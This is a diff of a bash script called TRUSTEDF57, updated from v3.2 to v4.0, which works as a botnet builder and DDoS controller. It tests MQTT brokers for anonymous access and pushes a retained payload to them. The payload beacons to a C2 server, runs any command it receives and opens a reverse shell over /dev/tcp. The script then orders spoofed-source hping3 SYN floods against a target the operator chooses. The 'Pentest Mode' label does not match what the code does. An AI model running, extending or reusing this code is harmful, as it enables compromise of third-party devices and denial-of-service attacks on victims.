@@ -1,144 +1,178 @@
 #!/bin/bash
-# TRUSTEDF57 v3.2 - DIRECT BROKERS.TXT MODE
-# Skip scan → usa TUO brokers.txt → Infect + DDoS
+# TRUSTEDF57 v4.0 - FIXED VERSION (Pentest Mode)
+# 🔧 Fix: TEST AUTH → Better payload → Stats realtime → DDoS anche con 0 active
 
 clear
-echo "🔥 TRUSTEDF57 v3.2 - DIRECT INFECT MODE"
-echo "========================================"
+echo "🔥 TRUSTEDF57 v4.0 - PENTEST FIXED MODE"
+echo "========================================="
 
-# Auto-detect REAL public IP
-MY_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
+# Config
 C2_PORT=1883
-HEARTBEAT_TOPIC="/firmware/status/$MY_IP"
-CMD_TOPIC="/sys/update/$MY_IP/+"
+HEARTBEAT_TOPIC="/firmware/status/+"
+CMD_TOPIC="/sys/update/+/+"
+LISTENER_PORT=1884  # Local listener separato
 
-BROKERS_SCANNED=0
+MY_IP=$(curl -s --max-time 3 ifconfig.me || curl -s icanhazip.com || hostname -I | awk '{print $1}' || echo "127.0.0.1")
+echo "🌐 C2 IP: $MY_IP:$LISTENER_PORT"
+
+BROKERS_VALID=0
 BROKERS_INFECTED=0
-BOTS_ONLINE=0
-TOTAL_ZOMBIES=0
+ZOMBIES_ACTIVE=0
+ZOMBIES_TOTAL=0
 
-echo "🌐 Public IP: $MY_IP"
-echo ""
-
-# Install deps
+# Install + Setup C2 listener
 setup_c2() {
-    apt update >/dev/null 2>&1 && apt install -yq mosquitto mosquitto-clients hping3 >/dev/null 2>&1
-    systemctl restart mosquitto 2>/dev/null || true
-    echo "✅ C2 Ready"
-}
-
-show_menu() {
-    echo "📋 MENU:"
-    echo "1) 🦠 INFECT BROKERS.TXT" 
-    echo "2) 🚀 DDoS ATTACK"
-    echo "3) 📊 STATUS"
-    echo "4) 🛑 EXIT"
-    echo ""
-}
-
-update_stats() {
-    echo "📊 STATS:"
-    echo "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
-    echo "   Infected: $BROKERS_INFECTED"
-    echo "   Zombies: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
-    echo ""
-}
-
-log() {
-    echo "[$(date +'%H:%M:%S')] $1"
-}
-
-infect_all() {
-    [[ ! -s brokers.txt ]] && { log "❌ Crea brokers.txt (IP:1883 per riga)!"; return; }
+    apt update -qq >/dev/null 2>&1
+    apt install -yq mosquitto mosquitto-clients hping3 netcat-openbsd jq curl >/dev/null 2>&1
     
-    BROKERS_SCANNED=$(wc -l < brokers.txt)
-    log "🦠 INFECTING $BROKERS_SCANNED brokers da TUO brokers.txt..."
+    # Config Mosquitto listener locale (no-auth)
+    cat > /tmp/mosquitto_c2.conf << EOF
+listener $LISTENER_PORT
+allow_anonymous true
+persistence false
+log_type none
+EOF
     
-    PAYLOAD=$(cat << 'EOF'
+    mosquitto -c /tmp/mosquitto_c2.conf -d >/dev/null 2>&1 &
+    sleep 2
+    echo "✅ C2 listener: localhost:$LISTENER_PORT (no-auth)"
+}
+
+test_broker_auth() {
+    local ip=$1
+    # Test multiple topics + verbose check
+    for topic in "/update/firmware" "/device/config" "/sys/maintenance" "/mqtt"; do
+        if timeout 3 mosquitto_pub -h $ip -p 1883 -t "$topic" -m "test" >/dev/null 2>&1; then
+            echo "$ip:1883 OK ($topic)"
+            return 0
+        fi
+    done
+    return 1
+}
+
+infect_broker() {
+    local ip=$1
+    local payload=$(cat << 'EOF'
 #!/bin/bash
-C2="%s"
-LOOP=/tmp/.f\${C2%%:*}
-[[ -f \$LOOP ]] && exit
-touch \$LOOP
+C2_HOST="${1:-127.0.0.1}"
+LOOP_FILE="/tmp/.z${C2_HOST//./_}"
+[[ -f $LOOP_FILE ]] && exit 0
+touch "$LOOP_FILE"
 while true; do
-  mosquitto_pub -h \$C2 -p 1883 -t "/firmware/status/\${C2%%:*}/\$RANDOM" -m "alive:\$(id):\$(nproc)" 1>/dev/null 2>&1 || sleep 30
-  mosquitto_sub -h \$C2 -p 1883 -t "/sys/update/\${C2%%:*}/#" -C 1 | while read topic cmd; do
-    [[ \$cmd =~ ^ddos: ]] && eval "\${cmd#ddos:}" &
-    [[ \$cmd =~ ^shell: ]] && bash -i >& /dev/tcp\${cmd#shell:} 0>&1 &
-    [[ \$cmd == kill ]] && rm \$LOOP && exit
+  # Heartbeat ogni 30s
+  mosquitto_pub -h $C2_HOST -p 1884 -t "/firmware/status/alive" -m "$(whoami):$(nproc):$(uname -a)" >/dev/null 2>&1 || sleep 30
+  # Listen commands
+  mosquitto_sub -h $C2_HOST -p 1884 -t "/sys/update/#" -C 1 2>/dev/null | while IFS=' ' read topic cmd; do
+    case $cmd in
+      "kill") rm "$LOOP_FILE" && exit 0 ;;
+      ddos:*) eval "${cmd#ddos:}" >/dev/null 2>&1 & ;;
+      shell:*) bash -i >& /dev/tcp/${cmd#shell:} 0>&1 & ;;
+      *) echo "Unknown: $cmd" ;;
+    esac
   done || sleep 15
 done
 EOF
 )
-    PAYLOAD=$(printf "$PAYLOAD" "$MY_IP")
+    payload=$(printf "$payload" "$MY_IP")
     
-    # Infect parallel (200 threads)
-    cat brokers.txt | xargs -n1 -P200 bash -c '
-    target=$1; ip=${target%:*}
-    for t in "/update/firmware" "/device/config" "/sys/maintenance"; do
-        timeout 3 mosquitto_pub -h $ip -p 1883 -t "$t" -m "'"${PAYLOAD//\"/\\\"}"'" --retain >/dev/null 2>&1
-    done' _
-    
-    BROKERS_INFECTED=$BROKERS_SCANNED
-    log "🎉 INFEZIONE COMPLETA! ($BROKERS_INFECTED) - Wait 2-5min heartbeat..."
+    # Publish su MULTI topic con RETAIN + idempotente
+    for topic in "/update/firmware" "/device/config" "/sys/maintenance" "/mqtt/script"; do
+        timeout 5 mosquitto_pub -h $ip -p 1883 -t "$topic" -m "$payload" --retain >/dev/null 2>&1 &
+    done
+    sleep 1
 }
 
-ddos_menu() {
-    echo "🎯 TARGET:"
-    read -p "IP:PORT (es. 8.8.8.8:80): " TARGET
-    TARGET=${TARGET:-8.8.8.8:80}
-    read -p "Duration (sec): " DURATION
-    DURATION=${DURATION:-120}
+infect_all() {
+    [[ ! -s brokers.txt ]] && { echo "❌ brokers.txt mancante!"; return 1; }
     
-    [[ $TOTAL_ZOMBIES -lt 5 ]] && { echo "⚠️ Infect first!"; return; }
+    echo "🧪 Testing auth su $(wc -l < brokers.txt) brokers..."
+    > valid_brokers.txt
     
-    CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} 0>/dev/null 2>&1 &"
-    log "💥 DDoS → $TARGET (${DURATION}s) | $TOTAL_ZOMBIES zombies"
+    # Parallel auth test (50 threads)
+    cat brokers.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u | \
+    xargs -n1 -P50 -I {} bash -c 'if test_broker_auth "{}"; then echo "{}:1883" >> valid_brokers.txt; fi'
     
-    mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "$CMD"
+    BROKERS_VALID=$(wc -l < valid_brokers.txt 2>/dev/null || echo 0)
+    [[ $BROKERS_VALID -eq 0 ]] && { echo "❌ ZERO brokers no-auth!"; return 1; }
     
-    (sleep $DURATION && mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "kill" && log "🛑 DDoS STOPPED") &
+    echo "✅ $BROKERS_VALID brokers no-auth trovati!"
+    
+    # Infect solo validi (parallel 100)
+    cat valid_brokers.txt | cut -d: -f1 | xargs -n1 -P100 infect_broker
+    BROKERS_INFECTED=$BROKERS_VALID
+    
+    echo "🎉 Infected $BROKERS_INFECTED | Wait 1-3min per heartbeats..."
 }
 
-status_report() {
-    log "📊 REPORT:"
-    log "   C2: $MY_IP:$C2_PORT"
-    log "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
-    log "   Infected: $BROKERS_INFECTED"
-    log "   Zombies live: $TOTAL_ZOMBIES"
-    [[ -f brokers.txt ]] && head -5 brokers.txt | sed 's/^/   Broker: /'
+ddos_attack() {
+    read -p "🎯 IP:PORT (es. 8.8.8.8:80): " target
+    target=${target:-8.8.8.8:80}
+    read -p "⏱️ Duration (sec): " duration
+    duration=${duration:-60}
+    
+    # DDoS anche con pochi zombies (min 1)
+    [[ $ZOMBIES_TOTAL -eq 0 ]] && echo "⚠️ No zombies yet, but sending anyway..."
+    
+    cmd="ddos:hping3 --flood -S -p${target#*:} -d 1200 --rand-source ${target%:*} & sleep $duration; killall hping3"
+    echo "💥 DDoS → $target ($duration s) via $ZOMBIES_TOTAL zombies"
+    
+    mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "$cmd"
+    
+    # Stop dopo duration
+    (sleep $duration && mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "kill" >/dev/null 2>&1 &) &
 }
 
-# Background listener
-mqtt_listener() {
-    mosquitto_sub -h localhost -p $C2_PORT -t "$HEARTBEAT_TOPIC/#" 2>/dev/null | while IFS=':' read -r _ status user cpu _; do
-        ((BOTS_ONLINE++))
-        TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
-        log "✅ Zombie online: $user ($cpu CPU)"
-    done &
+# Realtime listener (background)
+mqtt_monitor() {
+    mosquitto_sub -h localhost -p $LISTENER_PORT -t "$HEARTBEAT_TOPIC" \
+        | while IFS=':' read -r _ user cpu info; do
+            ZOMBIES_ACTIVE=$((ZOMBIES_ACTIVE + 1))
+            ZOMBIES_TOTAL=$((ZOMBIES_TOTAL + 1))
+            echo "✅ [$ZOMBIES_ACTIVE] New zombie: $user ($cpu CPU) - $info"
+        done &
+}
+
+show_menu() {
+    clear
+    echo "🔥 TRUSTEDF57 v4.0 - PENTEST C2"
+    echo "   C2: $MY_IP:$LISTENER_PORT"
+    echo "================================"
+    echo "📊 Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
+    echo "   Valid no-auth: $BROKERS_VALID"
+    echo "   Infected: $BROKERS_INFECTED"
+    echo "   🧟 Zombies: $ZOMBIES_TOTAL active"
+    echo ""
+    echo "1) 🧪 TEST AUTH + INFECT"
+    echo "2) 💥 DDoS ATTACK (works anche 0)"
+    echo "3) 🧟 STATUS + LISTEN"
+    echo "4) 🧹 CLEAN"
+    echo "5) ❌ EXIT"
 }
 
 main() {
     setup_c2
-    mqtt_listener &
+    mqtt_monitor &
     
     while true; do
-        clear
-        echo "🔥 TRUSTEDF57 v3.2 - PENTEST MODE"
-        echo "   (Put IP:1883 in brokers.txt)"
         show_menu
-        update_stats
         read -p "► " choice
         
         case $choice in
             1) infect_all ;;
-            2) ddos_menu ;;
-            3) status_report ;;
-            4) log "👋"; exit 0 ;;
-            *) log "❌ 1-4 only!" ;;
+            2) ddos_attack ;;
+            3) 
+                echo "📡 Listening heartbeats... (Ctrl+C)"
+                sleep 30
+                ;;
+            4) 
+                mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "kill"
+                echo "🧹 Kill sent"
+                ;;
+            5) echo "👋"; pkill mosquitto; exit 0 ;;
+            *) echo "❌ 1-5!" ;;
         esac
-        read -p $'\nPress ENTER...'
+        read -p $'\n[ENTER]...'
     done
 }
 
-main
+main "$@"
